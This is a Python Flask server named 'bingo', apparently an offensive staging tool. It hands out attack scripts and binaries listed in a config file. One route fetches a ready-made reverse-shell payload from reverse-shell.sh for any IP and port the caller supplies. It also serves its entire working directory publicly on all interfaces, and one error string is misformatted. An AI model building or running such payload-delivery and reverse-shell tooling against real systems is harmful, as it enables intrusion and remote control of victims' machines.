from flask import Flask, request, send_file, make_response, jsonify
import io
import requests
import sys
import pyfiglet
from random import choice
from termcolor import colored
import sys
import os

from src.loadconfig import load_config


colors = ['red',
    'yellow',
    'green',
    'cyan',
    'blue',
    'magenta',
]
fonts = ['smslant',
    'crawford',
    'cursive',
    'pyramid',
    'stacey',
    'slant',
    '5lineoblique',
    'ticks',
    'contessa',
    'hex',
    'pawp',
    'block',
    'graffiti',
    'linux',
    'charact3',
    'bulbhead',
]

def make_banner():
    print(colored(pyfiglet.figlet_format("bingo", font=choice(fonts)), choice(colors)))

def get_raw_url_response(url):
    return requests.get(url).text

def download_binary_from_url(url, binary_name):
    return send_file(io.BytesIO(requests.get(url).content), 
                 mimetype='application/octet-stream', 
                 download_name = binary_name)

def get_rev_shell(ip, port):
    return get_raw_url_response(f'https://reverse-shell.sh/{ip}:{port}')

static_folder = os.getcwd()
app = Flask(__name__, static_url_path='/', static_folder=static_folder)

myconfig = load_config('config.yaml')

@app.route('/')
def banner():
    response = make_response(pyfiglet.figlet_format("bingo", font=choice(fonts)), 200)
    response.mimetype = "text/plain"
    return response
    
@app.route('/search/<keyword>')
def search(keyword) -> dict:
    output = []
    for program in myconfig['program']:
        if keyword in program:
            program_dict = {
                'name': program,
                'type': myconfig['program'][program]['type'],
                'os': myconfig['program'][program]['os'],
            }
            output.append(program_dict)
    return jsonify({'search_results': output})

@app.route('/get/<program_name>')
def get(program_name):
    if program_name not in myconfig['program']:
        return 'f{program_name} not found in config file'

    program_config = myconfig['program'][program_name]  
    
    if program_config['type'] == 'script':
        return get_raw_url_response(program_config['url'])
    
    if program_config['type'] == 'binary':
        return download_binary_from_url(program_config['url'], program_name)

@app.route('/revshell/<ip>/<port>', methods=['GET'])
def revshell(ip, port):
    return get_raw_url_response(f'https://reverse-shell.sh/{ip}:{port}')

if __name__ == '__main__':
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    
    make_banner()
    
    app.run(port='5000', host='0.0.0.0', debug=False)